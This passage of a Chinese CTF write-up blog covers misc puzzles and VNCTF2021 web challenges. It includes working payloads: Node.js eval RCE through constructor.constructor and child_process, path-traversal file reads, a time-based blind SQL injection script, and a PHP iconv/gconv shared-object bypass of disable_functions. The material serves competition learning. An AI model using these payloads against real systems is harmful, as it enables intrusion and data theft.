+<p>而如果目标类中定义了私有的writeObject或readObject方法，那么序列化和反序列化的时候将<strong>调用目标类</strong>指定的<code>writeObject或readObject</code>方法来实现。<br><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023182813275.png" srcset="/img/loading.gif" lazyload alt="image-20231023182813275"></p>
+<p>修改为String数组，并增加get、set方法</p>
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023182852817.png" srcset="/img/loading.gif" lazyload alt="image-20231023182852817"></p>
+<p>覆盖即可反弹shell</p>
+<h2 id="misc-多了解一些吧，反正也不会"><a href="#misc-多了解一些吧，反正也不会" class="headerlink" title="misc   (多了解一些吧，反正也不会)"></a>misc   (多了解一些吧，反正也不会)</h2><h3 id="拉胯的三条命令"><a href="#拉胯的三条命令" class="headerlink" title="拉胯的三条命令"></a>拉胯的三条命令</h3><p>nmap流量分析，查看开放端口</p>
+<p><code>SYN</code>建立连接     <code>ACK</code>响应</p>
+<p>找同时有 <code>SYN,ACK</code>的端口</p>
+<h3 id="ML的第一步"><a href="#ML的第一步" class="headerlink" title="ML的第一步"></a>ML的第一步</h3><p>机器学习</p>
+<p>给出七十组x,y   ，对函数进行拟合</p>
+<p>然后回答出x所对应的y的值</p>
+<div class="code-wrapper"><pre><code class="hljs scss">import re
+import numpy as np 
+from pwn import *
+
+def <span class="hljs-built_in">process</span>(data):
+    x_data = []
+    y_data = []
+    for i in data:
+        z = i.<span class="hljs-built_in">split</span>(<span class="hljs-string">&#x27;,&#x27;</span>)
+        x = <span class="hljs-built_in">float</span>(z[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>:])
+        x_data.<span class="hljs-built_in">append</span>(x)
+        y = <span class="hljs-built_in">float</span>(z[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>:-<span class="hljs-number">2</span>])
+        y_data.<span class="hljs-built_in">append</span>(y)
+    return (np.<span class="hljs-built_in">array</span>(x_data),np.<span class="hljs-built_in">array</span>(y_data))
+
+if __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
+    p = <span class="hljs-built_in">remote</span>(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29773</span>)
+
+    <span class="hljs-built_in">print</span>(p.<span class="hljs-built_in">recvline</span>())
+    p.<span class="hljs-built_in">sendline</span>(<span class="hljs-string">&#x27;H3rmesk1t&#x27;</span>)
+
+    for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):
+        <span class="hljs-built_in">print</span>(p.<span class="hljs-built_in">recvline</span>())
+    p.<span class="hljs-built_in">sendline</span>()
+
+    data = []
+    for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">70</span>):
+        data.<span class="hljs-built_in">append</span>(p.<span class="hljs-built_in">recvline</span>())
+
+    (x,y) = <span class="hljs-built_in">process</span>(data)
+    W = np.<span class="hljs-built_in">poly1d</span>(np.<span class="hljs-built_in">polyfit</span>(x,y,<span class="hljs-number">10</span>))
+    <span class="hljs-built_in">print</span>(W)
+
+    p.<span class="hljs-built_in">recvline</span>()
+    p.<span class="hljs-built_in">sendline</span>()
+
+    for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):
+        information = p.<span class="hljs-built_in">recvline</span>()
+        xi = <span class="hljs-built_in">float</span>(re.<span class="hljs-built_in">compile</span>(b<span class="hljs-string">&#x27;When x=([0-9\.]+),y=?&#x27;</span>).<span class="hljs-built_in">findall</span>(information)[<span class="hljs-number">0</span>])
+        p.<span class="hljs-built_in">sendline</span>(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">W</span>(xi)))
+        <span class="hljs-built_in">print</span>(xi,<span class="hljs-built_in">W</span>(xi))
+
+    p.<span class="hljs-built_in">interactive</span>()</code></pre></div>
+
+<h3 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h3><p>pslist   找到</p>
+<blockquote>
+<p>notepad.exe pid 3552<br>TrueCrypt.exe pid 3364(磁盘加密工具)<br>mspaint.exe pid 2648(画图工具)</p>
+</blockquote>
+<div class="code-wrapper"><pre><code class="hljs stylus">-f mem<span class="hljs-selector-class">.raw</span> <span class="hljs-attr">--profile</span>=Win7SP1x86_23418 memdump -<span class="hljs-selector-tag">p</span> <span class="hljs-number">3552</span> -D ./</code></pre></div>
+
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023205141419.png" srcset="/img/loading.gif" lazyload alt="image-20231023205141419"></p>
+<p>notepad分析找到下载链接</p>
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023205230889.png" srcset="/img/loading.gif" lazyload alt="image-20231023205230889"></p>
+<p>mspaint.exe利用GIMP   把图像偏移对其</p>
+<p>最后是TrueCrypt.exe使用EFDD进行挂载</p>
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023205349780.png" srcset="/img/loading.gif" lazyload alt="image-20231023205349780"></p>
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023205523512.png" srcset="/img/loading.gif" lazyload alt="image-20231023205523512"></p>
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023205537572.png" srcset="/img/loading.gif" lazyload alt="image-20231023205537572"></p>
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023205556752.png" srcset="/img/loading.gif" lazyload alt="image-20231023205556752"></p>
+<p>最后使用<code>VeraCrypt</code></p>
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023205746871.png" srcset="/img/loading.gif" lazyload alt="image-20231023205746871"></p>
+<h3 id="Final-Game"><a href="#Final-Game" class="headerlink" title="Final Game"></a>Final Game</h3><p>得到一个vmdk镜像文件和一个加密的压缩包</p>
+<p>压缩包注释</p>
+<div class="code-wrapper"><pre><code class="hljs mel">Stupid mortal, you must enter the eighth <span class="hljs-keyword">circle</span> of Hell to get the Tip of god。<span class="hljs-string">&#x27;=B;:?8\&lt;;:921Uv.3,1*No&#x27;</span>&amp;J*)iF~%$#zy?w|&#123;zsr8pun4rTji/PONMLKJIHGFEDCBA@?&gt;=&lt;;:<span class="hljs-number">987</span>SRQ3IHMFKDCBf)(<span class="hljs-string">&#x27;&amp;%$#&quot;!~&#125;|&#123;zyxwvutsrqpon,+*)i&#x27;</span>&amp;%$&#123;zy?&#125;|&#123;t:xwp6Wsrkj0QPONMLKJIHGFEDCBA@VUTYXWVUTSRKoON0LKDCgfS</code></pre></div>
+
+<p>the eighth circle of Hell      神曲     Malebolge</p>
+<p><a target="_blank" rel="noopener" href="http://malbolge.doleczek.pl/">Malbolge - interpreter online (doleczek.pl)</a></p>
+<p>运行得到<code>%&amp;^&amp;#@()(*:&quot;;&#39;/,,</code></p>
+<p>解密压缩包得到提示</p>
+<div class="code-wrapper"><pre><code class="hljs brainfuck"><span class="hljs-comment">神说：要有ELF！！！</span>
+<span class="hljs-comment">神说：要有WORD！！！</span>
+<span class="hljs-comment">神说：要有NTFS！！！</span>
+<span class="hljs-comment">神说：要有PDF！！！</span>
+<span class="hljs-comment">神说：要有OSZ！！！</span>
+
+<span class="hljs-comment">地狱</span> <span class="hljs-literal">--</span> <span class="hljs-comment">炼狱</span> <span class="hljs-literal">--</span> <span class="hljs-comment">天堂</span></code></pre></div>
+
+<p>7z打开vmdk，按时间排序，发现</p>
+<div class="code-wrapper"><pre><code class="hljs moonscript">Windows7_by_Lamber.vmdk\Users\lenovo\Documents\Purgatory.zip Windows7_by_Lamber.vmdk\Users\lenovo\Desktop\Door.png Windows7_by_Lamber.vmdk\Users\lenovo\Music\paradise.zip Windows7_by_Lamber.vmdk\Users\lenovo\Downloads\proverbs.pdf</code></pre></div>
+
+<p><code>dir /r</code>，可以看到在<code>Door.png</code>这个文件后隐藏有exe文件，用工具<strong>ntfsstreameditor</strong>将其提取出来，得到<code>Purgatory.exe</code>这个文件</p>
+<p>执行得到一句话</p>
+<div class="code-wrapper"><pre><code class="hljs reasonml">请将该文件放入炼狱中执行（能进入天堂的是<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Mr</span>.</span></span>png，<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Mrs</span>.</span></span>jpg只能下地狱）</code></pre></div>
+
+<p>需要与<code>Windows7_by_Lamber.vmdk\Program Files (x86)\Linux\Purgatorio</code>文件放在一起运行</p>
+<p><code>Purgatorio</code>这个单词的意思，正是意大利语的<code>炼狱</code></p>
+<p>运行得到</p>
+<div class="code-wrapper"><pre><code class="hljs">智慧之神evoA说，你需要修复ELF</code></pre></div>
+
+<p>使用010editor修改<code>Purgatorio</code>文件头</p>
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023212419041.png" srcset="/img/loading.gif" lazyload alt="image-20231023212419041"></p>
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023212430993.png" srcset="/img/loading.gif" lazyload alt="image-20231023212430993"></p>
+<p>输入evoA</p>
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023212457530.png" srcset="/img/loading.gif" lazyload alt="image-20231023212457530"></p>
+<div class="code-wrapper"><pre><code class="hljs dns"><span class="hljs-number">30</span>e308e8e7122579b8ea2fae<span class="hljs-number">774d1999</span>解md5也可以得到evoA</code></pre></div>
+
+<p><code>pdfkG@0zl_3ptmVPfa7LHuB8rs#cRdi$</code>，为pdf开头，推测为此pdf文件的密码，输入后打开了pdf文件</p>
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023212544665.png" srcset="/img/loading.gif" lazyload alt="image-20231023212544665"></p>
+<p>键盘密码</p>
+<div class="code-wrapper"><pre><code class="hljs applescript">The password <span class="hljs-keyword">of</span> <span class="hljs-built_in">word</span> <span class="hljs-keyword">is</span> capital(PROVERBS OF GOD)</code></pre></div>
+
+<p>得到docm文件，百度可知docm文件为<strong>一种包含宏或启用了宏的文档</strong>，用word打开后查看宏：<strong>ALT+F8</strong>，可以看到有名为<strong>LargeSB</strong>的宏（大写字母即为<strong>LSB</strong>）</p>
+<p>运行宏得到大量base64字符串 （一眼base64隐写）</p>
+<div class="code-wrapper"><pre><code class="hljs gcode">Hidde<span class="hljs-symbol">n1</span><span class="hljs-symbol">nWord_</span></code></pre></div>
+
+<p>再看word文档的内容，为大量的16进制，<code>FF D8 FF E0 0D 0A 1A 0A</code>开头，但不是<code>FF D9</code>结尾，而<code>89 50 4E 47 0D 0A 1A 0A</code>又是PNG的文件头，所以推测其为被修改了文件头的PNG文件，将文件头改回来后python写入文件，得到PNG图片</p>
+<p>推测该PNG为需要密钥的LSB隐写，密钥为<code>Hidden1nWord_</code>，用脚本解密，得到内容如下</p>
+<div class="code-wrapper"><pre><code class="hljs erlang-repl">The password of paradise:Bliss_Syc!!!!</code></pre></div>
+
+<p>解压后得到osz文件，百度可知这种文件和游戏<code>osu!</code>相关，下载游戏后用游戏打开这个osz文件，发现是个可以玩的图，将这个osz文件拖进kali中，发现可以解压，解压后可以看到一个<strong>readme.jpg</strong>的文件，strings查看这个文件，在最后可以看到一些可读的数字和字符</p>
+<div class="code-wrapper"><pre><code class="hljs dns">in,map.flag,is :<span class="hljs-number">0036112</span>S0038362y0042<span class="hljs-number">112c0055162</span>&#123;<span class="hljs-number">0110912</span>
+<span class="hljs-number">0118712</span>
+<span class="hljs-number">0135512</span>
+<span class="hljs-number">0142112</span>
+<span class="hljs-number">0158163</span>
+<span class="hljs-number">0200412</span>
+<span class="hljs-number">0203862</span>
+<span class="hljs-number">0216312</span>
+<span class="hljs-number">0219762</span>
+<span class="hljs-number">0225312</span>
+<span class="hljs-number">0231312</span>
+<span class="hljs-number">0251862</span>
+<span class="hljs-number">0302512</span>
+<span class="hljs-number">0312112</span>
+<span class="hljs-number">0318412</span>
+<span class="hljs-number">0329628</span>
+...</code></pre></div>
+
+<p>每一行数字都对应一个时间，这个时间在游戏的图中对应了flag的一个字符，比如给出的例子，在这些数字的结尾也给了相应提示：<strong>Traversing.Time</strong></p>
+<h1 id="v-n-2021-（）"><a href="#v-n-2021-（）" class="headerlink" title="v&amp;n 2021   （）"></a>v&amp;n 2021   （）</h1><p>[VNCTF2021<a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/114949206">WEB]_s52g50pytxr6.xyz-CSDN博客</a>      Y4tacker师傅太强了</p>
+<h2 id="EZ-game"><a href="#EZ-game" class="headerlink" title="EZ_game"></a>EZ_game</h2><p>修改数值开挂硬玩通关即可</p>
+<p>修改  winTime.endtime&#x3D;任意  即可</p>
+<p>中间有很明显的一长串 [sojson.v4]的加密，拿到在线网站解就行</p>
+<p>在控制台的话   要先把开头结尾的sojson.v4去掉</p>
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023200739259.png" srcset="/img/loading.gif" lazyload alt="image-20231023200739259"></p>
+<h2 id="naive"><a href="#naive" class="headerlink" title="naive"></a>naive</h2><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> express <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;express&quot;</span>;
+<span class="hljs-keyword">import</span> bindings <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;bindings&quot;</span>;
+<span class="hljs-keyword">import</span> &#123; fileURLToPath &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;url&#x27;</span>
+<span class="hljs-keyword">import</span> path <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;path&quot;</span>;
+
+<span class="hljs-keyword">import</span> pkg <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;expression-eval&#x27;</span>;
+<span class="hljs-keyword">const</span> &#123; <span class="hljs-attr">eval</span>: eval_, parse &#125; = pkg;
+
+<span class="hljs-keyword">const</span> addon = <span class="hljs-title function_">bindings</span>(<span class="hljs-string">&quot;addon&quot;</span>);
+
+<span class="hljs-keyword">const</span> file = <span class="hljs-title function_">fileURLToPath</span>(<span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">url</span>);
+
+<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();
+app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span> &#125;));
+
+app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(<span class="hljs-string">&quot;static&quot;</span>));
+
+app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;/eval&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;
+  <span class="hljs-keyword">const</span> e = req.<span class="hljs-property">body</span>.<span class="hljs-property">e</span>;
+  <span class="hljs-keyword">const</span> code = req.<span class="hljs-property">body</span>.<span class="hljs-property">code</span>;
+  <span class="hljs-keyword">if</span> (!e || !code) &#123;
+    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;wrong?&quot;</span>);
+    <span class="hljs-keyword">return</span>;
+  &#125;
+  <span class="hljs-keyword">try</span> &#123;
+    <span class="hljs-keyword">if</span> (addon.<span class="hljs-title function_">verify</span>(code)) &#123;
+      res.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">String</span>(eval_(<span class="hljs-title function_">parse</span>(e))));
+    &#125; <span class="hljs-keyword">else</span> &#123;
+      res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;wrong?&quot;</span>);
+    &#125;
+  &#125; <span class="hljs-keyword">catch</span> (e) &#123;
+    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e)
+    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;wrong?&quot;</span>);
+  &#125;
+&#125;);
+
+app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;/source&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;
+  <span class="hljs-keyword">let</span> p = req.<span class="hljs-property">query</span>.<span class="hljs-property">path</span> || file;
+  p = path.<span class="hljs-title function_">resolve</span>(path.<span class="hljs-title function_">dirname</span>(file), p);
+  <span class="hljs-keyword">if</span> (p.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;flag&quot;</span>)) &#123;
+    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;no flag!&quot;</span>);
+  &#125; <span class="hljs-keyword">else</span> &#123;
+    res.<span class="hljs-title function_">sendFile</span>(p);
+  &#125;
+&#125;);
+
+app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">err, req, res, next</span>) =&gt;</span> &#123;
+  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err)
+  res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&quot;index.html&quot;</span>);
+&#125;);
+
+app.<span class="hljs-title function_">listen</span>(process.<span class="hljs-property">env</span>.<span class="hljs-property">PORT</span> || <span class="hljs-number">80</span>);</code></pre></div>
+
+<p>任意文件读取、命令执行（但要通过<code>addon.verify(code)</code>）</p>
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023224558055.png" srcset="/img/loading.gif" lazyload alt="image-20231023224558055"></p>
+<p>可以看出bindings(“addon”);会引入build&#x2F;Release&#x2F;addon.node里面的包，因此我们配合上面文件下载，访问</p>
+<div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">source</span>?path=../build/Release/addon.node</code></pre></div>
+
+<p>据说逆向得到<code>yoshino-s_want_a_gf,qq1735439536</code></p>
+<p>利用 <code>res.send(String(eval_(parse(e))));</code>去实现任意命令的执行了，</p>
+<p>(1).constructor.constructor可以拿到Funtion从而实现自定义匿名函数（没怎么做过nodejs的题，好像都是两次constructor拿到Function即可）</p>
+<p>常规payload：</p>
+<div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">code</span>=yoshi<span class="hljs-literal">no</span>-s_want_a_gf,qq1735439536&amp;e=(<span class="hljs-number">1</span>).constructor.constructor(<span class="hljs-string">&quot;return require(&#x27;child_process&#x27;).execSync(\&quot;whoami\&quot;).toString();&#125;)&quot;</span>)()<span class="hljs-comment">;</span></code></pre></div>
+
+<p>后来几经波折发现在package.json<code>/source?path=../package.json</code>当中有一行<code>&quot;type&quot;: &quot;module&quot;</code>这也是本题的关键所在</p>
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023225409500.png" srcset="/img/loading.gif" lazyload alt="image-20231023225409500"></p>
+<p>当type字段指定值为<strong>module</strong>则采用ESModule规范</p>
+<p>ES6不是CommonJS，因此不可以使用require导入，这就是前面代码执行异常的原因</p>
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023225646835.png" srcset="/img/loading.gif" lazyload alt="image-20231023225646835"></p>
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023225843143.png" srcset="/img/loading.gif" lazyload alt="image-20231023225843143"></p>
+<p>动态加载模块</p>
+<div class="code-wrapper"><pre><code class="hljs arcade">code=yoshino-s_want_a_gf,qq1735439536&amp;e=<span class="hljs-function">(<span class="hljs-params"><span class="hljs-number">1</span></span>).<span class="hljs-params">constructor</span>.<span class="hljs-params">constructor</span>(<span class="hljs-params"><span class="hljs-string">&quot;return import(&#x27;child_process&#x27;).then((module)=&gt;&#123;module.execSync(\&quot;whoami\&quot;).toString();&#125;)&quot;</span></span>)<span class="hljs-params">()</span>;</span></code></pre></div>
+
+<p>我们知道nodejs支持设置静态目录从而实现直接访问，在源码当中我们发现</p>
+<div class="code-wrapper"><pre><code class="hljs fsharp">app.<span class="hljs-keyword">use</span>(express.<span class="hljs-keyword">static</span>(<span class="hljs-string">&quot;static&quot;</span>));</code></pre></div>
+
+<p>因此把结果写入static目录下</p>
+<div class="code-wrapper"><pre><code class="hljs arcade">code=yoshino-s_want_a_gf,qq1735439536&amp;e=<span class="hljs-function">(<span class="hljs-params"><span class="hljs-number">1</span></span>).<span class="hljs-params">constructor</span>.<span class="hljs-params">constructor</span>(<span class="hljs-params"><span class="hljs-string">&quot;return+import(&#x27;child_process&#x27;).then((module)=&gt;&#123;module.execSync(\&quot;cat ../flag&gt;&gt; ./static/4.js\&quot;);&#125;)&quot;</span></span>)<span class="hljs-params">()</span>;</span></code></pre></div>
+
+<p>最后访问</p>
+<div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">1</span>adff864-<span class="hljs-number">6</span>d0f-<span class="hljs-number">49</span>d3-<span class="hljs-number">8127</span>-db3e6f1b1167.node3.buuoj.cn/<span class="hljs-number">4</span>.js</code></pre></div>
+
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><div class="code-wrapper"><pre><code class="hljs abnf">const addon <span class="hljs-operator">=</span> bindings(<span class="hljs-string">&quot;addon&quot;</span>)<span class="hljs-comment">;</span></code></pre></div>
+
+<p>会引入<code>../build/Release/addon.node</code></p>
+<div class="code-wrapper"><pre><code class="hljs gradle"><span class="hljs-regexp">/source?path=../</span><span class="hljs-keyword">package</span>.json</code></pre></div>
+
+<p>查看package.json发现是ES6规范，使用import进行动态加载模块</p>
+<h2 id="realezjvav"><a href="#realezjvav" class="headerlink" title="realezjvav"></a>realezjvav</h2><p>登陆页面，在password使用笛卡尔积进行盲注 </p>
+<p>（select * from A,B）利用数据过多产生延时的效果</p>
+<div class="code-wrapper"><pre><code class="hljs stan">import requests
+import time
+url = <span class="hljs-string">&quot;http://192.168.0.104:8080/user/login&quot;</span>
+i = <span class="hljs-number">0</span>
+flag = <span class="hljs-string">&quot;&quot;</span>
+<span class="hljs-keyword">while</span> True :
+    i += <span class="hljs-number">1</span>
+    <span class="hljs-built_in">head</span> = <span class="hljs-number">32</span>
+    <span class="hljs-built_in">tail</span> = <span class="hljs-number">126</span>
+    <span class="hljs-keyword">while</span> <span class="hljs-built_in">head</span> &lt; <span class="hljs-built_in">tail</span> :
+        mid = <span class="hljs-built_in">head</span> + <span class="hljs-built_in">tail</span> &gt;&gt; <span class="hljs-number">1</span>
+        payload = <span class="hljs-string">&quot;a&#x27; or (if(ascii(substr(password,%d,1))&gt;%d,(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,information_schema.columns/**/B,information_schema.tables/**/C),1))#&quot;</span> % (i,mid)
+        <span class="hljs-title">data</span> = &#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span> , <span class="hljs-string">&quot;password&quot;</span> : payload&#125;   
+        start_time = time.time()
+        r = requests.post(url,<span class="hljs-title">data</span> = <span class="hljs-title">data</span>)
+        <span class="hljs-built_in">print</span>(<span class="hljs-title">data</span>[&#x27;password&#x27;])
+        end_time = time.time()
+        <span class="hljs-keyword">if</span> end_time - start_time &gt; <span class="hljs-number">3</span>:
+            <span class="hljs-built_in">head</span> = mid + <span class="hljs-number">1</span>
+        <span class="hljs-keyword">else</span> :
+            <span class="hljs-built_in">tail</span> = mid
+    <span class="hljs-keyword">if</span> <span class="hljs-built_in">head</span>!=<span class="hljs-number">32</span>:
+        flag += chr(<span class="hljs-built_in">head</span>)
+        <span class="hljs-built_in">print</span>(flag)
+    <span class="hljs-keyword">else</span> :
+        <span class="hljs-keyword">break</span></code></pre></div>
+
+<p>最后得到密码是<code>no_0ne_kn0w_th1s</code>  （运行了一下，是真的难）<br>登陆后创建角色以后，发现隐藏路由<code>searchimage路由可以任意文件读取</code>，因为是spring项目所以我们尝试去读取pom.xml，拼接<code>searchimage?img=../../../../../pom.xml</code>  （一个不多、一个不少）</p>
+<p>能找到fastjson1.2.27的依赖，但是要用1.2.47的绕过来打</p>
+<p>&#x2F;create路由有</p>
+<div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">roleJson</span>=&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>&#125;</code></pre></div>
+
+<p>配合看到的依赖，就是fastjson反序列化 </p>
+<p>直接jdbcrowsetImpl</p>
+<h2 id="Easy-laravel"><a href="#Easy-laravel" class="headerlink" title="Easy_laravel"></a>Easy_laravel</h2><p>。。。简直是神仙题目</p>
+<p>Laravel Debug Rce   由于源码中对一些已公开的pop链做了修改。并且php版本为7.4没有assert、web目录只有session和log目录有写权限。需要自己挖一个eval的POP链。</p>
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231024172058873.png" srcset="/img/loading.gif" lazyload alt="image-20231024172058873"></p>
+<p>漏洞的路由</p>
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231024172410335.png" srcset="/img/loading.gif" lazyload alt="image-20231024172410335"></p>
+<p>写一个phar在logs下，一直调用phar反序列化。eval执行代码</p>
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231024172251893.png" srcset="/img/loading.gif" lazyload alt="image-20231024172251893"></p>
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231024172518027.png" srcset="/img/loading.gif" lazyload alt="image-20231024172518027"></p>
+<p>调用phpinfo()发现有disable_funciton和open_basedir，发现禁用其他函数。但是可以用global协议查看根目录</p>
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231024172750973.png" srcset="/img/loading.gif" lazyload alt="image-20231024172750973"></p>
+<p>原生类遍历根目录</p>
+<p>发现有&#x2F;readflag。可以用伪协议触发iconv bypass disable_function</p>
+<p>生成so</p>
+<div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-comment">#include &lt;stdio.h&gt;</span>
+<span class="hljs-comment">#include &lt;stdlib.h&gt;</span>
+void gconv() &#123;&#125;
+void gconv_init() &#123;
+  system(<span class="hljs-string">&quot;/readflag &gt; /tmp/flag&quot;</span>);
+  <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);
+&#125;
+gcc payload.c -o payload.so -shared -fPI</code></pre></div>
+
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231024172948143.png" srcset="/img/loading.gif" lazyload alt="image-20231024172948143"></p>
+<div class="code-wrapper"><pre><code class="hljs reasonml">file<span class="hljs-constructor">_put_contents(&#x27;<span class="hljs-params">php</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">filter</span><span class="hljs-operator">/</span><span class="hljs-params">write</span>=<span class="hljs-params">convert</span>.<span class="hljs-params">iconv</span>.<span class="hljs-params">payload</span>.<span class="hljs-params">utf</span>-8<span class="hljs-operator">/</span><span class="hljs-params">resource</span>=<span class="hljs-operator">/</span><span class="hljs-params">tmp</span><span class="hljs-operator">/</span><span class="hljs-params">guoke</span>&#x27;,123)</span>;
+file<span class="hljs-constructor">_get_contents(&#x27;<span class="hljs-operator">/</span><span class="hljs-params">tmp</span><span class="hljs-operator">/</span><span class="hljs-params">file</span>&#x27;)</span>;</code></pre></div>
+
+<p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231024173115630.png" srcset="/img/loading.gif" lazyload alt="image-20231024173115630"></p>
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="冰冰好像藏着秘密"><a href="#冰冰好像藏着秘密" class="headerlink" title="冰冰好像藏着秘密"></a>冰冰好像藏着秘密</h3><p>FFT （傅里叶变换）</p>
+<div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
+<span class="hljs-keyword">import</span> cv2 <span class="hljs-keyword">as</span> cv
